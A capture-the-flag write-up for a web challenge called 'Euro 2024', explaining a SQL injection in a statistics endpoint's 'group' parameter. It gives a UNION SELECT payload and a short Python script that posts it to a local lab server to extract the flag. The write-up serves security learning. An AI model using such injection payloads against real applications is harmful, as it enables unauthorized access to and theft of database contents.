# Euro 2024
## Challenge
The challenge involves a web application that provides statistics for different groups participating in a tournament. The objective is to exploit an SQL Injection vulnerability to extract the flag.

## Solution
The provided solution uses an SQL Injection attack to retrieve the flag from the database. Below is the breakdown of the approach:

### 1. Understanding the Vulnerability
The endpoint `/api/group-stats` appears to be vulnerable to SQL Injection. The input parameter `group` is directly embedded into an SQL query without proper sanitization.

### 2. Crafting the Payload
The payload used to exploit the vulnerability is:

```sql
' UNION SELECT flag, null, null, null, null, null, null, null FROM FLAG; -- -
```

This payload:
- Breaks out of the existing query context using `' UNION SELECT`.
- Selects the `flag` column from the `FLAG` table.
- Uses `null` values to match the expected number of columns.
- Comments out the rest of the SQL query to prevent syntax errors.

## Solution
```python
#!/usr/bin/env python3
import requests
URL = 'http://localhost:8002'
PAYLOAD = "' UNION SELECT flag" + ", null" * 7 + " FROM FLAG; -- -"

r = requests.post(URL + '/api/group-stats', data={'group' : PAYLOAD})
print(r.json()['data'][0]['group_id'])```
```

## Author
**Author**: [`@ale18V`](https://github.com/ale18V/) <br>
**Date**: 2024-11-13 <br>
**Category**: Web Security